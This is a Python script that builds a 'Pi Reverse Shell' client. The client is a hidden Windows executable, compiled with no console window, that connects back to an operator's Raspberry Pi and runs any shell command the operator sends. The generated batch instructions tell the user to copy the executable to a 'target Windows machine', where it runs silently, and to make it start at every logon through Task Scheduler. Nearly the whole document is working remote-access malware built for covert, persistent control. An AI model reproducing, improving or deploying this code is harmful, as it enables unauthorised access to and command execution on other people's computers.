import os
import sys
import subprocess
import shutil

def check_pyinstaller():
    try:
        import PyInstaller
        return True
    except ImportError:
        return False

def install_pyinstaller():
    print("[*] PyInstaller not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    print("[+] PyInstaller installed.")

def main():
    print("=" * 52)
    print("  Pi Reverse Shell - Client Builder")
    print("=" * 52)
    print()

    host = input("Enter the Pi's IP or Twingate hostname: ").strip()
    if not host:
        print("[!] Error: host cannot be empty.")
        sys.exit(1)

    port_input = input("Enter the port [default: 6000]: ").strip()
    port = 6000
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            print("[!] Invalid port. Using 6000.")
            port = 6000

    exe_name = input("Enter the output .exe name (without extension) [default: client]: ").strip() or "client"

    print()

    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")
    os.makedirs(output_dir, exist_ok=True)

    # Write a temporary configured client script for PyInstaller
    client_code = f'''import socket
import subprocess
import os
import time

PI_HOST = "{host}"
PI_PORT = {port}
cwd = os.getcwd()

def connect_to_pi():
    global cwd
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((PI_HOST, PI_PORT))

            while True:
                data = client.recv(4096)
                if not data:
                    break
                cmd = data.decode().strip()

                if cmd.lower().startswith("cd"):
                    path = cmd[3:].strip()
                    if not path:
                        cwd = os.path.expanduser("~")
                    else:
                        new_path = os.path.abspath(os.path.join(cwd, path))
                        if os.path.isdir(new_path):
                            cwd = new_path
                            client.sendall(f"{{cwd}}> \\n".encode())
                            continue
                        else:
                            client.sendall(b"The system cannot find the path specified.\\n")
                            continue

                if cmd.lower() == "cls":
                    client.sendall(b"\\x1b[2J\\x1b[H")
                    continue

                try:
                    result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "\\n"
                except Exception as e:
                    output = f"Error: {{e}}\\n"

                client.sendall(output.encode())
        except:
            time.sleep(2)

if __name__ == "__main__":
    connect_to_pi()
'''

    temp_script = os.path.join(output_dir, "_client_build_temp.py")
    with open(temp_script, "w") as f:
        f.write(client_code)

    if not check_pyinstaller():
        install_pyinstaller()

    build_tmp = os.path.join(output_dir, "_build_tmp")

    print(f"[*] Building {exe_name}.exe — this may take a moment...")
    result = subprocess.run(
        [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--distpath", output_dir,
            "--workpath", build_tmp,
            "--specpath", build_tmp,
            "--name", exe_name,
            temp_script,
        ],
        capture_output=True,
        text=True,
    )

    # Clean up temp files
    os.remove(temp_script)
    if os.path.exists(build_tmp):
        shutil.rmtree(build_tmp)

    if result.returncode != 0:
        print(f"[!] PyInstaller failed. Output:\n{result.stderr[-2000:]}")
        sys.exit(1)

    print(f"[+] {exe_name}.exe built successfully.")

    # Write setup_info.bat
    bat_content = f"""@echo off
color 0A
echo ============================================================
echo   Pi Reverse Shell ^| Setup Information
echo ============================================================
echo.
echo   Pi Host  :  {host}
echo   Port     :  {port}
echo   EXE Name :  {exe_name}.exe
echo.
echo ============================================================
echo   STEP 1 ^| RASPBERRY PI
echo ============================================================
echo.
echo   1. Transfer server.py to your Raspberry Pi.
echo   2. On the Pi, run:
echo.
echo        python server.py
echo.
echo   3. The server will wait on port {port} for the client.
echo.
echo ============================================================
echo   STEP 2 ^| WINDOWS CLIENT
echo ============================================================
echo.
echo   1. Copy {exe_name}.exe to the target Windows machine.
echo   2. Run {exe_name}.exe — it connects silently in the background.
echo   3. To run automatically on login, add it to Task Scheduler:
echo.
echo        - Open Task Scheduler
echo        - Action: Create Task
echo        - Triggers tab: New ^> At log on
echo        - Actions tab: Start a program ^> {exe_name}.exe
echo        - Check "Run whether user is logged on or not" if needed
echo.
echo ============================================================
echo   STEP 3 ^| TWINGATE (REMOTE ACCESS OVER INTERNET)
echo ============================================================
echo.
echo   1. Install the Twingate client on your Raspberry Pi.
echo   2. Add the Pi as a Resource in your Twingate Admin Console.
echo   3. The Resource IP/hostname is what you set as PI_HOST.
echo   4. Connect Twingate on your operator machine before running
echo      server.py when accessing the Pi remotely.
echo.
echo ============================================================
echo.
pause
"""

    bat_path = os.path.join(output_dir, "setup_info.bat")
    with open(bat_path, "w") as f:
        f.write(bat_content)

    print(f"[+] setup_info.bat created.")
    print()
    print("  Output files:")
    print(f"    output/{exe_name}.exe   — deploy to the Windows machine")
    print(f"    output/setup_info.bat  — run for full setup instructions")
    print()
    print("  Don't forget to also run build_server.py to generate server.py for the Pi.")
    print()

if __name__ == "__main__":
    main()
